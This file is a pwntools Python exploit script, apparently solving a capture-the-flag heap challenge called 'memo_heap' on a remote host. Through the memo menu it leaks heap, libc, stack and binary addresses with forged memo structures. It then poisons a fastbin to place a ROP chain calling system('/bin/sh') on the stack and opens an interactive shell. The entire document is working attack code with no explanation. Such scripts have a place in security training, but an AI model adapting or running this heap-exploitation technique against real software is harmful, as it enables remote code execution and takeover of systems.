from pwn import *
from time import sleep

def Create(size, data):
    r.recvuntil('Your choice: ')
    r.send('1')
    r.recvuntil('What is size of memo you want to create? ')
    r.send(str(size))
    if (size != 0):
        r.recvuntil('Name of memo: ')
        r.send(data)
    
def Edit(index, name):
    r.recvuntil('Your choice: ')
    r.send('2')
    r.recvuntil('Index of memo you want to edit: ')
    r.send(str(index))
    if (len(name) != 0):
        r.recvuntil('New name of memo: ')
        r.send(name)

def Show(index):
    r.recvuntil('Your choice: ')
    r.send('3')
    r.recvuntil('Index of memo you want to show: ')
    r.send(str(index))
    return r.recvline_startswith('Name: ').strip()

def Delete(index):
    r.recvuntil('Your choice: ')
    r.send('4')
    r.recvuntil('Index of memo you want to delete: ')
    r.send(str(index))


libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
# r = process('./memo_heap')
# libc = ELF('libc.so')
r = remote('128.199.249.37', 3003   )
# gdb.attach(r, "b*0x0000555555554D38")
Create(0, "") #0
Create(0, "") #1
Edit(0, "")
Edit(1, "")
Create(0, "") #2
Delete(1)
Create(0, "") #1
Delete(2)
Create(0x60, "a") #2
tmp = Show(1)+"\x00"*8
heap = u64(tmp[6:14])
log.info("heap: %#x" %heap)
Create(0x400, "a") #3
Create(0x30, "a") #4
Delete(3)
Delete(1)
payload = p64(heap+0x90) #name fake of 2
payload += p32(0) #size fake of 2
payload += p32(1) #state fake of 2
Create(0x10, payload) #1
tmp = Show(2)+ "\x00"*8
main_arena = u64(tmp[6:14])-0x58
log.info("main arena: %#x" %main_arena)
base = main_arena - 0x3c4b20
system = base + libc.symbols['system']
sh = base + next(libc.search('/bin/sh\x00'))
environ = base + libc.symbols['environ']
log.info("base: %#x" %base)
log.info("system: %#x" %system)
log.info("sh: %#x" %sh)
log.info("eviron: %#x" %environ)
Delete(1)
payload = p64(environ) #name fake of 2
payload += p32(0) #size fake of 2
payload += p32(1) #state fake of 2 
Create(0x10, payload) #1
tmp = Show(2)+ "\x00"*8
rbp_main = u64(tmp[6:14]) - 0xf8
leak = rbp_main-0x43
log.info("rbp main: %#x" %rbp_main)
log.info("leak: %#x" %leak)
Delete(1)
payload = p64(rbp_main-8) #name fake of 2
payload += p32(0) #size fake of 2
payload += p32(1) #state fake of 2
Create(0x10, payload) #1
tmp = Show(2)+ "\x00"*8
basefile = u64(tmp[6:14]) - 0x11c9
log.info("base file: %#x" %basefile)
poprdi = basefile + 0x1263
Delete(1)
payload = p64(heap) #name fake of 2
payload += p32(0) #size fake of 2
payload += p32(1) #state fake of 2
Create(0x10, payload) #1
Edit(2, "")
Delete(1)
payload = p64(heap) #name fake of 2
payload += p32(0x60) #size fake of 2
payload += p32(1) #state fake of 2
Create(0x10, payload) #1
Edit(2, p64(leak))
Create(0x60, "xxx")
payload = "\x00"*3
payload += p64(rbp_main)
payload += p64(poprdi)+p64(sh)+p64(system)
Create(0x60, payload)
r.interactive()
